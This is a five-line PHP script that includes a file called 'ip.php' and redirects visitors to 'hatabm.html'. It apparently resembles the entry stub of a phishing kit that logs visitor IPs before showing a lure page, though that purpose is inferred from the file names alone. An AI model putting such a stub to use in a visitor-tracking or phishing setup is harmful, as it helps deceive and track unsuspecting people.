<?php
include 'ip.php';
header('Location: hatabm.html');
exit
?>
